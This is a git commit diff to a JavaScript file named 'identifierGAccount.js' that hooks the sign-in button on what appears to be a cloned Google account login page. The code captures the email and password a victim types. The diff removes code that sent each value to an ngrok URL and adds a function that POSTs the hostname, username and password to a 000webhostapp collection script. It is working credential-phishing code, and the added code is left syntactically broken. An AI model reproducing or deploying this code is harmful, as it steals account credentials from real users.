20e502efa074228eba943e3bb8ee3f2e8fa779ad
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 21:52:01 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -1,15 +1,8 @@
 function send_email(){
     let email = document.querySelector('[type="email"]');
     let param = email.value;
-
-    let xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
-        }
-    };
-    xhr.send();
+    
+    return param
 }
 
 function send_pwd(){
@@ -20,24 +13,43 @@ function send_pwd(){
     let email = document.querySelector('[type="password"]');
     let param = email.value;
 
-    let xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
-            console.log(xhr.responseText);
-        }
-    };
-    xhr.send();
+    return param
 
     })
+}
+
+
+function send_data(usuario, senha){
+    const url = 'https://get-data123.000webhostapp.com/user.php';
+    const params = {
+      hostname: location.host,
+      username: usuario,
+      password: senha
+    };
+
+    fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(params)
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error(error
+
+
 }
 
 
 const btn = document.getElementsByClassName('VfPpkd-LgbsSe');
 
 btn[1].addEventListener('click', function(){
-    send_email();
+    user = send_email();
     setTimeout(function() {
-        send_pwd()
+        pwd = send_pwd()
+        
+        setTimeout(function(){send_data(user, pwd)})
     }, 3000);
+    
 })
